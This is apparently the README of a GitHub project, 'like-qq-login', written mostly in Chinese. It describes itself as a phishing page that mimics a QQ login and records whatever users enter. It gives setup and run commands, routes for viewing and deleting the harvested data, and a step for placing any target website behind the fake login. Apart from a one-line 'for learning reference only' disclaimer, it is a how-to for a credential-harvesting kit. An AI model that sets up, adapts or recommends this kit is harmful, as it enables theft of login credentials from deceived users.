# like-qq-login

## 作用
钓鱼页面，获取当前页面用户输入的用户信息

## 效果

![4554fb731b9d71a68a85dd27d4d5943](https://user-images.githubusercontent.com/32216292/200274398-75c675b8-0fc7-4483-ac7e-117d53795214.jpg)

![d2b978f13e6a0c6169750a61f9e5893](https://user-images.githubusercontent.com/32216292/200274473-10125dae-b21e-4324-b6d0-35ef6e6d3e42.png)

![b69b1f37e371516e32e8a22ee961f4a](https://user-images.githubusercontent.com/32216292/200274545-4af6962d-90a3-4884-8a56-f618e5b9083c.jpg)

## 查看数据
```
// 请根据您实际的地址来，在浏览器访问
localhost:3000/qop/show
```
![b69b1f37e371516e32e8a22ee961f4a](https://user-images.githubusercontent.com/32216292/200274545-4af6962d-90a3-4884-8a56-f618e5b9083c.jpg)
## 清空数据
```
// 请根据您实际的地址来，在浏览器访问
localhost:3000/qop/delete
```

## 改变背景
```
// 在 pages/index.vue 页面，找到 embed， src 换成目标网站URL即可
<embed v-if="loadEmbed" src="http://youself.site" width="100%" class="h-screen"/>
```

## 声明
仅供学习参考

## 使用方式

```bash
# 安装 node.js 后，全局安装 yarn
npm install -g yarn

# yarn
yarn install
```

## 开发模式，默认 3000 端口

Start the development server on http://localhost:3000

```bash
yarn dev
```

## 编译，用于正式环境
```bash
yarn build
```

本地预编译:

```bash
yarn run preview
```

nuxt 文档 [nuxt3](https://v3.nuxtjs.org/guide/deploy/presets).

